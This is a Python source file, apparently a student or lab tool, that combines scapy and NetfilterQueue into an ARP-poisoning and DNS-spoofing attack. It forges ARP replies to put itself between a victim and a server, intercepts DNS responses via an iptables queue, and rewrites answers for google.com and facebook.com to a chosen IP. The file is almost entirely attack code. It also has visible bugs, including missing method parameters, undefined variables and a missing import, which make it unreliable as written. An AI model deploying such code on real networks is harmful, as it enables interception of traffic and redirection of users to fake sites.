from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import logging as log


class DefaultTool:
    def __init__(self, victim_ip, server_ip, dns_hosts):
        self.victim_ip = victim_ip
        self.server_ip = server_ip
        self.network_interface = "enp0s3"
        
        # initialise dns_hosts dictionary for dns spoof
        self.dns_hosts = dns_hosts
        #example{
         #   b"www.google.com.": "199.15.163.145",
         #   b"google.com.": "199.15.163.145",
         #  b"facebook.com.": "199.15.163.145"
        #}
        self.queueNum = 4
        self.queue = NetfilterQueue()

    @staticmethod
    def get_mac_from_ip(ip):
        result, _ = arping(ip)
        for _, received in result:
            return received[Ether].src

    def arp_poisoning(self):
        victim_mac = self.get_mac_from_ip(self.victim_ip)
        server_mac = self.get_mac_from_ip(self.server_ip)
        # getting self mac will throw exception if enp0s3 network interface does not exit
        attacker_mac = get_if_hwaddr(self.network_interface)

        victim_arp = Ether() / ARP()
        server_arp = Ether() / ARP()

        # Poison the victim's ARP table
        victim_arp[Ether].src = attacker_mac
        victim_arp[ARP].hwsrc = attacker_mac
        victim_arp[ARP].psrc = server_ip
        victim_arp[ARP].hwdst = victim_mac
        victim_arp[ARP].pdst = victim_ip

        sendp(victim_arp, iface=self.network_interface)

        # Poison the server's ARP table
        server_arp[Ether].src = attacker_mac
        server_arp[ARP].hwsrc = attacker_mac
        server_arp[ARP].psrc = victim_ip
        server_arp[ARP].hwdst = server_mac
        server_arp[ARP].pdst = server_ip

        sendp(server_arp, iface=self.network_interface)

        time.sleep(3)
        
        
    # DNS spoofing  
    #Step1: Create a queue to intercept all packets from DNS
    def nfqueue():
        #IP table rule to sniff DNS packets
        self.queue.bind(self.queueNum, self.intercept_packets)
        
        try:
            self.queue.run()
        except KeyboardInterrupt: #to escape when crtl+c clicked
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")
    
    #Step2: convert netfilter packet to scapy packet  
    def intercept_packets():
        
        #IP table rule to sniff DNS packets
        #os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  4")
                
        #get netfilter packets and convert to python
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            
            # if the packet is a DNS Resource Record (DNS reply)
            # modify the packet
            print("(Before):", scapy_packet.summary())
            
            try:
                scapy_packet = modify_packet(scapy_packet)
            except IndexError:
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            
            print("(After):", scapy_packet.summary())
            # set back as netfilter queue packet
            packet.set_payload(bytes(scapy_packet))
        # accept the packet
        packet.accept()
     
    # Step 3: Carry out DNS spoof   
    def modify_packet(packet):
        """
        Modifies the DNS Resource Record `packet` ( the answer part)
        to map our globally defined `dns_hosts` dictionary.
        For instance, whenever we see a google.com answer, this function replaces 
        the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
        """
        # get the DNS question name, the domain name
        qname = packet[DNSQR].qname
        if qname not in self.dns_hosts:
            # if the website isn't in our record
            # we don't wanna modify that
            print("no modification:", qname)
            return packet
        # craft new answer, overriding the original
        # setting the rdata for the IP we want to redirect (spoofed)
        # for instance, google.com will be mapped to "192.168.1.100"
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.dns_hosts[qname])
        # set the answer count to 1
        packet[DNS].ancount = 1
        # delete checksums and length of packet, because we have modified the packet
        # new calculations are required ( scapy will do automatically )
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        # return the modified packet
        return packet


victim_ip = "192.168.56.103"
server_ip = "192.168.56.102"
dict_site = {
            b"www.google.com.": "199.15.163.145",
            b"google.com.": "199.15.163.145",
            b"facebook.com.": "199.15.163.145"
           }
tool = DefaultTool(victim_ip, server_ip)
tool.arp_poisoning()
tool.nfqueue()
